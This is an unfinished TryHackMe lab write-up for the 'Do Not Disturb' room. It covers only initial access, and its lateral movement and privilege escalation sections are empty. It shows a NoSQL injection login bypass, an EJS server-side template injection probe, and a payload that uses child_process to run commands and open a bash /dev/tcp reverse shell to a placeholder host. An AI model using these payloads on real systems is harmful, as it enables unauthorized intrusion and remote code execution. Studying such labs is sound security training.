# Do Not Disturb (in progress)

> **TryHackMe Room:** [Do Not Disturb](https://tryhackme.com/room/hh-donotdisturb-84a45644)

This write-up covers how I approached the room, step by step. Flags and specific key and password values are not included.

## Introduction

This is the hardest room of all the Hacker Holidays challenges. It felt very challenging from the start, even though the site rates it as medium, with a duration of 60 minutes. I watched many videos on this room, and even so, I only fully understood the initial access and privilege escalation parts. I still do not understand the lateral movement part, although I know which vulnerability was exploited there. For that reason, this write-up currently covers only the initial access part. I will add the lateral movement and privilege escalation sections once I understand them well enough to explain them.

## Initial Access

The `nmap` scan showed two open ports: `22` and `80`. Port `80` presented a login form with `attendant` as a placeholder. I first tried a few test credentials, such as `123` and `abc`, while watching the network tab in the browser's developer tools.

The network tab showed that the site runs on Express.js, a Node.js framework. Knowing beforehand that the room was vulnerable to NoSQL injection, I used the following payload:

```web
username=attendant&password[$ne]=anything
```

`$ne` stands for "not equal." The payload effectively asks the database for a user named `attendant` whose password is not equal to `anything`, which is true for any actual password. Sending this request created a cookie and returned an HTTP 302 redirect to `/staff`, a path I already knew about from running `gobuster` against the machine's IP.

Opening `http://<Machine-IP>/staff` directly in another tab returned a 401 error. After copying the cookie's key and value from the earlier request into that tab, I was able to access the page.

Once inside, I was presented with a box containing the following:

```txt
Confirmation template (EJS — use <%= guest %> to personalize)
```

Below it was a greeting message. The `<%= guest %>` placeholder was the key detail: if code placed inside it gets executed, the site is vulnerable to server-side template injection (SSTI). The standard payload to check for this is:

```txt
<%= 7*7 %>
```

If it returns `49`, the site is vulnerable, and in this case it was. Before building a reverse shell, I tested whether a basic command would execute:

```js
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

It worked, so I used the same technique to get a reverse shell:

```js
<%= global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/<MACHINE_IP>/<PORT> 0>&1"').toString() %>
```

With a listener running on a terminal, I gained access and read the user flag.

> *To be continued.*

## Lateral Movement

## Privilege Escalation

## Conclusion
